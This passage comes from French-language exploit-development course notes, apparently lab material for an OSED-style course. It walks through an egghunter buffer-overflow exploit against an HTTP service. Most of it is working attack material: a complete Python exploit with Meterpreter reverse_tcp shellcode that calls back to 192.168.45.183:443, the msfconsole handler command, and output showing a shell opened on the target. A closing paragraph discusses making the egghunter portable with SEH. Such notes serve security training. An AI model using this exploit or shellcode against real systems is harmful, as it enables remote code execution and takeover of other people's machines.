<a id="__codelineno-65-19" name="__codelineno-65-19" href="#__codelineno-65-19"></a><span class="n">payload</span> <span class="p">+=</span> <span class="n">b</span><span class="s2">&quot;\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01&quot;</span>
<a id="__codelineno-65-20" name="__codelineno-65-20" href="#__codelineno-65-20"></a><span class="n">payload</span> <span class="p">+=</span> <span class="n">b</span><span class="s2">&quot;\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b&quot;</span>
<a id="__codelineno-65-21" name="__codelineno-65-21" href="#__codelineno-65-21"></a><span class="n">payload</span> <span class="p">+=</span> <span class="n">b</span><span class="s2">&quot;\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b&quot;</span>
<a id="__codelineno-65-22" name="__codelineno-65-22" href="#__codelineno-65-22"></a><span class="n">payload</span> <span class="p">+=</span> <span class="n">b</span><span class="s2">&quot;\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00&quot;</span>
<a id="__codelineno-65-23" name="__codelineno-65-23" href="#__codelineno-65-23"></a><span class="n">payload</span> <span class="p">+=</span> <span class="n">b</span><span class="s2">&quot;\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26&quot;</span>
<a id="__codelineno-65-24" name="__codelineno-65-24" href="#__codelineno-65-24"></a><span class="n">payload</span> <span class="p">+=</span> <span class="n">b</span><span class="s2">&quot;\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29&quot;</span>
<a id="__codelineno-65-25" name="__codelineno-65-25" href="#__codelineno-65-25"></a><span class="n">payload</span> <span class="p">+=</span> <span class="n">b</span><span class="s2">&quot;\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a&quot;</span>
<a id="__codelineno-65-26" name="__codelineno-65-26" href="#__codelineno-65-26"></a><span class="n">payload</span> <span class="p">+=</span> <span class="n">b</span><span class="s2">&quot;\x0a\x68\xc0\xa8\x2d\xb7\x68\x02\x00\x01\xbb&quot;</span>
<a id="__codelineno-65-27" name="__codelineno-65-27" href="#__codelineno-65-27"></a><span class="n">payload</span> <span class="p">+=</span> <span class="n">b</span><span class="s2">&quot;\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68&quot;</span>
<a id="__codelineno-65-28" name="__codelineno-65-28" href="#__codelineno-65-28"></a><span class="n">payload</span> <span class="p">+=</span> <span class="n">b</span><span class="s2">&quot;\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57&quot;</span>
<a id="__codelineno-65-29" name="__codelineno-65-29" href="#__codelineno-65-29"></a><span class="n">payload</span> <span class="p">+=</span> <span class="n">b</span><span class="s2">&quot;\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a&quot;</span>
<a id="__codelineno-65-30" name="__codelineno-65-30" href="#__codelineno-65-30"></a><span class="n">payload</span> <span class="p">+=</span> <span class="n">b</span><span class="s2">&quot;\xff\x4e\x08\x75\xec\xe8\x67\x00\x00\x00\x6a&quot;</span>
<a id="__codelineno-65-31" name="__codelineno-65-31" href="#__codelineno-65-31"></a><span class="n">payload</span> <span class="p">+=</span> <span class="n">b</span><span class="s2">&quot;\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff&quot;</span>
<a id="__codelineno-65-32" name="__codelineno-65-32" href="#__codelineno-65-32"></a><span class="n">payload</span> <span class="p">+=</span> <span class="n">b</span><span class="s2">&quot;\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68&quot;</span>
<a id="__codelineno-65-33" name="__codelineno-65-33" href="#__codelineno-65-33"></a><span class="n">payload</span> <span class="p">+=</span> <span class="n">b</span><span class="s2">&quot;\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53&quot;</span>
<a id="__codelineno-65-34" name="__codelineno-65-34" href="#__codelineno-65-34"></a><span class="n">payload</span> <span class="p">+=</span> <span class="n">b</span><span class="s2">&quot;\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68&quot;</span>
<a id="__codelineno-65-35" name="__codelineno-65-35" href="#__codelineno-65-35"></a><span class="n">payload</span> <span class="p">+=</span> <span class="n">b</span><span class="s2">&quot;\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28&quot;</span>
<a id="__codelineno-65-36" name="__codelineno-65-36" href="#__codelineno-65-36"></a><span class="n">payload</span> <span class="p">+=</span> <span class="n">b</span><span class="s2">&quot;\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b&quot;</span>
<a id="__codelineno-65-37" name="__codelineno-65-37" href="#__codelineno-65-37"></a><span class="n">payload</span> <span class="p">+=</span> <span class="n">b</span><span class="s2">&quot;\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61&quot;</span>
<a id="__codelineno-65-38" name="__codelineno-65-38" href="#__codelineno-65-38"></a><span class="n">payload</span> <span class="p">+=</span> <span class="n">b</span><span class="s2">&quot;\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff&quot;</span>
<a id="__codelineno-65-39" name="__codelineno-65-39" href="#__codelineno-65-39"></a><span class="n">payload</span> <span class="p">+=</span> <span class="n">b</span><span class="s2">&quot;\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6&quot;</span>
<a id="__codelineno-65-40" name="__codelineno-65-40" href="#__codelineno-65-40"></a><span class="n">payload</span> <span class="p">+=</span> <span class="n">b</span><span class="s2">&quot;\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53&quot;</span>
<a id="__codelineno-65-41" name="__codelineno-65-41" href="#__codelineno-65-41"></a><span class="n">payload</span> <span class="p">+=</span> <span class="n">b</span><span class="s2">&quot;\xff\xd5&quot;</span>
</code></pre></div>
<p>On met à jour l'exploit avec le shellcode de Meterpreter :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a><span class="ch">#!/usr/bin/python</span>
<a id="__codelineno-66-2" name="__codelineno-66-2" href="#__codelineno-66-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
<a id="__codelineno-66-3" name="__codelineno-66-3" href="#__codelineno-66-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<a id="__codelineno-66-4" name="__codelineno-66-4" href="#__codelineno-66-4"></a><span class="kn">from</span><span class="w"> </span><span class="nn">struct</span><span class="w"> </span><span class="kn">import</span> <span class="n">pack</span>
<a id="__codelineno-66-5" name="__codelineno-66-5" href="#__codelineno-66-5"></a>
<a id="__codelineno-66-6" name="__codelineno-66-6" href="#__codelineno-66-6"></a><span class="k">try</span><span class="p">:</span>
<a id="__codelineno-66-7" name="__codelineno-66-7" href="#__codelineno-66-7"></a>  <span class="n">server</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<a id="__codelineno-66-8" name="__codelineno-66-8" href="#__codelineno-66-8"></a>  <span class="n">port</span> <span class="o">=</span> <span class="mi">80</span>
<a id="__codelineno-66-9" name="__codelineno-66-9" href="#__codelineno-66-9"></a>  <span class="n">size</span> <span class="o">=</span> <span class="mi">253</span>
<a id="__codelineno-66-10" name="__codelineno-66-10" href="#__codelineno-66-10"></a>
<a id="__codelineno-66-11" name="__codelineno-66-11" href="#__codelineno-66-11"></a>  <span class="n">httpMethod</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x31\xC9\x85\xC9\x0F\x84\x11</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot; /&quot;</span>  <span class="c1"># xor ecx, ecx; test ecx, ecx; je 0x17 </span>
<a id="__codelineno-66-12" name="__codelineno-66-12" href="#__codelineno-66-12"></a>
<a id="__codelineno-66-13" name="__codelineno-66-13" href="#__codelineno-66-13"></a>  <span class="n">egghunter</span> <span class="o">=</span> <span class="p">(</span><span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x90\x90\x90\x90\x90\x90\x90\x90</span><span class="s2">&quot;</span> <span class="c1"># NOP sled</span>
<a id="__codelineno-66-14" name="__codelineno-66-14" href="#__codelineno-66-14"></a>             <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x66\x81\xca\xff\x0f\x42\x52\xb8</span><span class="s2">&quot;</span>
<a id="__codelineno-66-15" name="__codelineno-66-15" href="#__codelineno-66-15"></a>             <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x3a\xfe\xff\xff\xf7\xd8\xcd\x2e</span><span class="s2">&quot;</span>
<a id="__codelineno-66-16" name="__codelineno-66-16" href="#__codelineno-66-16"></a>             <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x3c\x05\x5a\x74\xeb\xb8\x77\x30</span><span class="s2">&quot;</span>
<a id="__codelineno-66-17" name="__codelineno-66-17" href="#__codelineno-66-17"></a>             <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x30\x74\x89\xd7\xaf\x75\xe6\xaf</span><span class="s2">&quot;</span>
<a id="__codelineno-66-18" name="__codelineno-66-18" href="#__codelineno-66-18"></a>             <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x75\xe3\xff\xe7</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-66-19" name="__codelineno-66-19" href="#__codelineno-66-19"></a>
<a id="__codelineno-66-20" name="__codelineno-66-20" href="#__codelineno-66-20"></a>  <span class="n">inputBuffer</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x41</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">size</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">egghunter</span><span class="p">))</span>
<a id="__codelineno-66-21" name="__codelineno-66-21" href="#__codelineno-66-21"></a>  <span class="n">inputBuffer</span><span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="p">(</span><span class="mh">0x418674</span><span class="p">))</span>                  <span class="c1"># 0x00418674 - pop eax; ret</span>
<a id="__codelineno-66-22" name="__codelineno-66-22" href="#__codelineno-66-22"></a>  <span class="n">httpEndRequest</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\r\n\r\n</span><span class="s2">&quot;</span>
<a id="__codelineno-66-23" name="__codelineno-66-23" href="#__codelineno-66-23"></a>
<a id="__codelineno-66-24" name="__codelineno-66-24" href="#__codelineno-66-24"></a>  <span class="n">payload</span> <span class="o">=</span>  <span class="sa">b</span><span class="s2">&quot;&quot;</span>
<a id="__codelineno-66-25" name="__codelineno-66-25" href="#__codelineno-66-25"></a>  <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5</span><span class="s2">&quot;</span>
<a id="__codelineno-66-26" name="__codelineno-66-26" href="#__codelineno-66-26"></a>  <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b</span><span class="s2">&quot;</span>
<a id="__codelineno-66-27" name="__codelineno-66-27" href="#__codelineno-66-27"></a>  <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x72\x28\x31\xff\x0f\xb7\x4a\x26\x31\xc0\xac</span><span class="s2">&quot;</span>
<a id="__codelineno-66-28" name="__codelineno-66-28" href="#__codelineno-66-28"></a>  <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7</span><span class="s2">&quot;</span>
<a id="__codelineno-66-29" name="__codelineno-66-29" href="#__codelineno-66-29"></a>  <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x49\x75\xef\x52\x8b\x52\x10\x8b\x42\x3c\x57</span><span class="s2">&quot;</span>
<a id="__codelineno-66-30" name="__codelineno-66-30" href="#__codelineno-66-30"></a>  <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0</span><span class="s2">&quot;</span>
<a id="__codelineno-66-31" name="__codelineno-66-31" href="#__codelineno-66-31"></a>  <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x8b\x58\x20\x8b\x48\x18\x50\x01\xd3\x85\xc9</span><span class="s2">&quot;</span>
<a id="__codelineno-66-32" name="__codelineno-66-32" href="#__codelineno-66-32"></a>  <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x74\x3c\x49\x31\xff\x8b\x34\x8b\x01\xd6\x31</span><span class="s2">&quot;</span>
<a id="__codelineno-66-33" name="__codelineno-66-33" href="#__codelineno-66-33"></a>  <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xc0\xc1\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4</span><span class="s2">&quot;</span>
<a id="__codelineno-66-34" name="__codelineno-66-34" href="#__codelineno-66-34"></a>  <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58</span><span class="s2">&quot;</span>
<a id="__codelineno-66-35" name="__codelineno-66-35" href="#__codelineno-66-35"></a>  <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01</span><span class="s2">&quot;</span>
<a id="__codelineno-66-36" name="__codelineno-66-36" href="#__codelineno-66-36"></a>  <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b</span><span class="s2">&quot;</span>
<a id="__codelineno-66-37" name="__codelineno-66-37" href="#__codelineno-66-37"></a>  <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b</span><span class="s2">&quot;</span>
<a id="__codelineno-66-38" name="__codelineno-66-38" href="#__codelineno-66-38"></a>  <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00</span><span class="s2">&quot;</span>
<a id="__codelineno-66-39" name="__codelineno-66-39" href="#__codelineno-66-39"></a>  <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26</span><span class="s2">&quot;</span>
<a id="__codelineno-66-40" name="__codelineno-66-40" href="#__codelineno-66-40"></a>  <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29</span><span class="s2">&quot;</span>
<a id="__codelineno-66-41" name="__codelineno-66-41" href="#__codelineno-66-41"></a>  <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a</span><span class="s2">&quot;</span>
<a id="__codelineno-66-42" name="__codelineno-66-42" href="#__codelineno-66-42"></a>  <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x0a\x68\xc0\xa8\x2d\xb7\x68\x02\x00\x01\xbb</span><span class="s2">&quot;</span>
<a id="__codelineno-66-43" name="__codelineno-66-43" href="#__codelineno-66-43"></a>  <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68</span><span class="s2">&quot;</span>
<a id="__codelineno-66-44" name="__codelineno-66-44" href="#__codelineno-66-44"></a>  <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57</span><span class="s2">&quot;</span>
<a id="__codelineno-66-45" name="__codelineno-66-45" href="#__codelineno-66-45"></a>  <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a</span><span class="s2">&quot;</span>
<a id="__codelineno-66-46" name="__codelineno-66-46" href="#__codelineno-66-46"></a>  <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xff\x4e\x08\x75\xec\xe8\x67\x00\x00\x00\x6a</span><span class="s2">&quot;</span>
<a id="__codelineno-66-47" name="__codelineno-66-47" href="#__codelineno-66-47"></a>  <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff</span><span class="s2">&quot;</span>
<a id="__codelineno-66-48" name="__codelineno-66-48" href="#__codelineno-66-48"></a>  <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68</span><span class="s2">&quot;</span>
<a id="__codelineno-66-49" name="__codelineno-66-49" href="#__codelineno-66-49"></a>  <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53</span><span class="s2">&quot;</span>
<a id="__codelineno-66-50" name="__codelineno-66-50" href="#__codelineno-66-50"></a>  <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68</span><span class="s2">&quot;</span>
<a id="__codelineno-66-51" name="__codelineno-66-51" href="#__codelineno-66-51"></a>  <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28</span><span class="s2">&quot;</span>
<a id="__codelineno-66-52" name="__codelineno-66-52" href="#__codelineno-66-52"></a>  <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b</span><span class="s2">&quot;</span>
<a id="__codelineno-66-53" name="__codelineno-66-53" href="#__codelineno-66-53"></a>  <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61</span><span class="s2">&quot;</span>
<a id="__codelineno-66-54" name="__codelineno-66-54" href="#__codelineno-66-54"></a>  <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff</span><span class="s2">&quot;</span>
<a id="__codelineno-66-55" name="__codelineno-66-55" href="#__codelineno-66-55"></a>  <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6</span><span class="s2">&quot;</span>
<a id="__codelineno-66-56" name="__codelineno-66-56" href="#__codelineno-66-56"></a>  <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53</span><span class="s2">&quot;</span>
<a id="__codelineno-66-57" name="__codelineno-66-57" href="#__codelineno-66-57"></a>  <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xff\xd5</span><span class="s2">&quot;</span>
<a id="__codelineno-66-58" name="__codelineno-66-58" href="#__codelineno-66-58"></a>
<a id="__codelineno-66-59" name="__codelineno-66-59" href="#__codelineno-66-59"></a>  <span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;w00tw00t&quot;</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span>  <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x44</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">400</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
<a id="__codelineno-66-60" name="__codelineno-66-60" href="#__codelineno-66-60"></a>
<a id="__codelineno-66-61" name="__codelineno-66-61" href="#__codelineno-66-61"></a>  <span class="n">buf</span> <span class="o">=</span> <span class="n">httpMethod</span> <span class="o">+</span> <span class="n">egghunter</span> <span class="o">+</span> <span class="n">inputBuffer</span> <span class="o">+</span>  <span class="n">httpEndRequest</span> <span class="o">+</span> <span class="n">shellcode</span>
<a id="__codelineno-66-62" name="__codelineno-66-62" href="#__codelineno-66-62"></a>
<a id="__codelineno-66-63" name="__codelineno-66-63" href="#__codelineno-66-63"></a>  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Sending buffer&quot;</span><span class="p">)</span>
<a id="__codelineno-66-64" name="__codelineno-66-64" href="#__codelineno-66-64"></a>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<a id="__codelineno-66-65" name="__codelineno-66-65" href="#__codelineno-66-65"></a>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">server</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
<a id="__codelineno-66-66" name="__codelineno-66-66" href="#__codelineno-66-66"></a>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
<a id="__codelineno-66-67" name="__codelineno-66-67" href="#__codelineno-66-67"></a>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
<a id="__codelineno-66-68" name="__codelineno-66-68" href="#__codelineno-66-68"></a>
<a id="__codelineno-66-69" name="__codelineno-66-69" href="#__codelineno-66-69"></a>  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Done!&quot;</span><span class="p">)</span>
<a id="__codelineno-66-70" name="__codelineno-66-70" href="#__codelineno-66-70"></a>
<a id="__codelineno-66-71" name="__codelineno-66-71" href="#__codelineno-66-71"></a><span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">error</span><span class="p">:</span>
<a id="__codelineno-66-72" name="__codelineno-66-72" href="#__codelineno-66-72"></a>  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Could not connect!&quot;</span><span class="p">)</span>
</code></pre></div>
<p>On lance un <em>handler</em> Meterpreter :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)-[/</span><span class="n">media</span><span class="p">/</span><span class="err">…</span><span class="p">/</span><span class="n">os</span><span class="p">/</span><span class="n">exp</span><span class="p">-</span><span class="n">301-osed</span><span class="p">/</span><span class="n">cours</span><span class="p">/</span><span class="n">cours6</span><span class="p">]</span>
<a id="__codelineno-67-2" name="__codelineno-67-2" href="#__codelineno-67-2"></a><span class="err">└─</span><span class="p">$</span> <span class="n">sudo</span> <span class="n">msfconsole</span> <span class="n">-q</span> <span class="n">-x</span> <span class="s2">&quot;use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.45.183; set LPORT 443; exploit&quot;</span>
<a id="__codelineno-67-3" name="__codelineno-67-3" href="#__codelineno-67-3"></a><span class="no">[sudo]</span> <span class="n">password</span> <span class="k">for</span> <span class="n">kali</span><span class="p">:</span>
<a id="__codelineno-67-4" name="__codelineno-67-4" href="#__codelineno-67-4"></a><span class="p">[*]</span> <span class="n">Using</span> <span class="n">configured</span> <span class="n">payload</span> <span class="n">generic</span><span class="p">/</span><span class="n">shell_reverse_tcp</span>
<a id="__codelineno-67-5" name="__codelineno-67-5" href="#__codelineno-67-5"></a><span class="n">PAYLOAD</span> <span class="p">=&gt;</span> <span class="n">windows</span><span class="p">/</span><span class="n">meterpreter</span><span class="p">/</span><span class="n">reverse_tcp</span>
<a id="__codelineno-67-6" name="__codelineno-67-6" href="#__codelineno-67-6"></a><span class="n">LHOST</span> <span class="p">=&gt;</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">45</span><span class="p">.</span><span class="n">183</span>
<a id="__codelineno-67-7" name="__codelineno-67-7" href="#__codelineno-67-7"></a><span class="n">LPORT</span> <span class="p">=&gt;</span> <span class="n">443</span>
<a id="__codelineno-67-8" name="__codelineno-67-8" href="#__codelineno-67-8"></a><span class="p">[*]</span> <span class="n">Started</span> <span class="n">reverse</span> <span class="n">TCP</span> <span class="n">handler</span> <span class="n">on</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">45</span><span class="p">.</span><span class="n">183</span><span class="p">:</span><span class="n">443</span>
</code></pre></div>
<p>Puis on lance l'exploit mis à jour :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)-[/</span><span class="n">media</span><span class="p">/</span><span class="err">…</span><span class="p">/</span><span class="n">os</span><span class="p">/</span><span class="n">exp</span><span class="p">-</span><span class="n">301-osed</span><span class="p">/</span><span class="n">cours</span><span class="p">/</span><span class="n">cours6</span><span class="p">]</span>
<a id="__codelineno-68-2" name="__codelineno-68-2" href="#__codelineno-68-2"></a><span class="err">└─</span><span class="p">$</span> <span class="n">python3</span> <span class="n">egg_v12</span><span class="p">.</span><span class="n">py</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">234</span><span class="p">.</span><span class="n">10</span>
<a id="__codelineno-68-3" name="__codelineno-68-3" href="#__codelineno-68-3"></a><span class="n">Sending</span> <span class="n">buffer</span>
<a id="__codelineno-68-4" name="__codelineno-68-4" href="#__codelineno-68-4"></a><span class="n">Done</span><span class="p">!</span>
</code></pre></div>
<p>Et on reçoit un <em>reverse shell</em> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a><span class="p">[*]</span> <span class="n">Sending</span> <span class="n">stage</span> <span class="p">(</span><span class="n">175686</span> <span class="n">bytes</span><span class="p">)</span> <span class="n">to</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">234</span><span class="p">.</span><span class="n">10</span>
<a id="__codelineno-69-2" name="__codelineno-69-2" href="#__codelineno-69-2"></a><span class="p">[*]</span> <span class="n">Meterpreter</span> <span class="n">session</span> <span class="n">1</span> <span class="n">opened</span> <span class="p">(</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">45</span><span class="p">.</span><span class="n">183</span><span class="p">:</span><span class="n">443</span> <span class="p">-&gt;</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">234</span><span class="p">.</span><span class="n">10</span><span class="p">:</span><span class="n">53994</span><span class="p">)</span> <span class="n">at</span> <span class="n">2024</span><span class="p">-</span><span class="n">07</span><span class="p">-</span><span class="n">26</span> <span class="n">17</span><span class="p">:</span><span class="n">21</span><span class="p">:</span><span class="n">38</span> <span class="p">-</span><span class="n">0400</span>
<a id="__codelineno-69-3" name="__codelineno-69-3" href="#__codelineno-69-3"></a>
<a id="__codelineno-69-4" name="__codelineno-69-4" href="#__codelineno-69-4"></a><span class="n">meterpreter</span> <span class="p">&gt;</span> <span class="n">getuid</span>
<a id="__codelineno-69-5" name="__codelineno-69-5" href="#__codelineno-69-5"></a><span class="n">Server</span> <span class="n">username</span><span class="p">:</span> <span class="n">CLIENT</span><span class="p">\</span><span class="n">Offsec</span>
</code></pre></div>
<h3 id="ameliorer-la-portabilite-du-egghunter-en-utilisant-seh-tbd">Améliorer la portabilité du Egghunter en utilisant SEH [TbD]</h3>
<p>Initialement, le code egghunter utilisait la fonction <code>NtAccessCheckAndAuditAlarm</code>, car le code de l'appel système n'avait pas changé depuis Windows 8. On a dû écrire en dur le nouveau code de l'appel système, impactant la portabilité de l'exploit, car il devient nécessaire d'identifier la version de l'OS en amont.</p>
<p>On veut trouver un moyen que ça fonctionne sur toutes les versions de Windows.</p>
<p>L'idée d'utiliser <code>NtAccessCheckAndAuditAlarm</code> permet de déléguer la prise en charge de l'<em>access violation</em> au système d'exploitation. Cependant, nous pourrions le faire nous-mêmes.</p>
<p>On va créer notre propre <em>Structured Exception Handler</em> pour gérer l'accès à des pages mémoires invalides. Le processus <code>SEH</code> n'a pas beaucoup changé par rapport aux anciennes versions de Windows. L'impact est que le code de egghunter passe de <em>35b</em> a <em>60b</em>.</p>







  
    
  
  


  <aside class="md-source-file">
    
      
